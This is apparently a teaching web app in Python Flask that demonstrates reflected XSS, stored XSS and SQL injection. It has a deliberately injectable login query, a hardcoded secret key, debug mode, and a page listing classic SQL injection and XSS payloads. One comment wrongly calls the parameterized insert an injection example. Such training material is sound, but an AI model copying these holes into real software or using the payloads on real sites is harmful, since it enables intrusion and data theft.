from flask import Flask, request, render_template, redirect, url_for, session
import sqlite3

app = Flask(__name__)
app.secret_key = "s3cr3t_k3y"  # Replace with a secure key in production


# Initialize the database
def init_db():
    conn = sqlite3.connect('test.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS comments (id INTEGER PRIMARY KEY, content TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)''')
    conn.commit()
    conn.close()


@app.route('/')
def home():
    return render_template('home.html')


# Reflected XSS Example
@app.route('/xss-reflected', methods=['GET', 'POST'])
def xss_reflected():
    user_input = None
    if request.method == 'POST':
        # Get the input from the form
        user_input = request.form.get('user_input', '')
    return render_template('xss_reflected.html', user_input=user_input)

# Stored XSS Example
@app.route('/xss-stored', methods=['GET', 'POST'])
def xss_stored():
    # Connect to the SQLite database
    conn = sqlite3.connect('test.db')
    c = conn.cursor()
    
    # Handle form submission (POST request)
    if request.method == 'POST':
        # Get content from the form field, using .get() to avoid KeyError
        content = request.form.get('content')  # Use .get() instead of [] for safer handling
        
        # Insert the content into the database (SQL Injection vulnerability example)
        if content:  # Only insert if content is not empty
            c.execute("INSERT INTO comments (content) VALUES (?)", (content,))
            conn.commit()
    
    # Retrieve all comments from the database
    comments = c.execute("SELECT content FROM comments").fetchall()
    
    # Close the database connection
    conn.close()
    
    # Render the template and pass the comments
    return render_template('xss_stored.html', comments=comments)

@app.route('/sql-injection', methods=['GET', 'POST'])
def sql_injection():
    conn = sqlite3.connect('test.db')
    c = conn.cursor()
    result = ""
    
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        # Vulnerable query with correct SQL precedence and parentheses
        query = f"SELECT * FROM users WHERE username = '{username}' AND (password = '{password}' OR '1' = '1')"
        print("Executing query:", query)  # Debugging purpose
        
        try:
            c.execute(query)  # Execute the query
            result = c.fetchall()  # Fetch the results
            if not result:
                result = "No matching users found."
        except sqlite3.OperationalError as e:
            result = f"SQL Error: {e}"

    conn.close()
    return render_template('sql_injection.html', result=result)


@app.route('/payloads')
def payloads():
    payloads = [
        # SQL Injection payloads
        {"name": "Basic SQL Injection", "payload": "' OR '1'='1", "description": "Basic bypass to always return true."},
        {"name": "Union-Based Injection", "payload": "' UNION SELECT null, username, password FROM users --", "description": "Used to fetch data from the users table."},
        {"name": "Comment Injection", "payload": "' --", "description": "Uses comment syntax to ignore the rest of the query."},
        {"name": "Time-Based Blind Injection", "payload": "' OR SLEEP(5) --", "description": "Delays the response to test for injection vulnerability."},

        # Reflected XSS payloads
        {"name": "Basic Reflected XSS", "payload": "<script>alert('XSS');</script>", "description": "Injects a script to execute an alert."},
        {"name": "Image XSS", "payload": "<img src='x' onerror='alert(\"XSS\")'>", "description": "Uses an image tag with an error handler."},
        {"name": "SVG XSS", "payload": "<svg onload='alert(\"XSS\")'></svg>", "description": "Uses an SVG tag to execute JavaScript."},
        {"name": "Body XSS", "payload": "<body onload='alert(\"XSS\")'></body>", "description": "Executes script when the body loads."},

        # Stored XSS payloads
        {"name": "Basic Stored XSS", "payload": "<script>alert('Stored XSS');</script>", "description": "Injects a script that will execute when the page is loaded."},
        {"name": "Image Stored XSS", "payload": "<img src='x' onerror='alert(\"Stored XSS\")'>", "description": "Uses an image tag to trigger a stored alert."},
        {"name": "SVG Stored XSS", "payload": "<svg onload='alert(\"Stored XSS\")'></svg>", "description": "Injects SVG to store a malicious script."},
        {"name": "Body Stored XSS", "payload": "<body onload='alert(\"Stored XSS\")'></body>", "description": "Injects a body tag with an alert on load."},
    ]
    
    return render_template('payloads.html', payloads=payloads)


@app.route('/prevention')
def prevention():
    return render_template('prevention.html')

if __name__ == '__main__':
    init_db()
    app.run(debug=True)
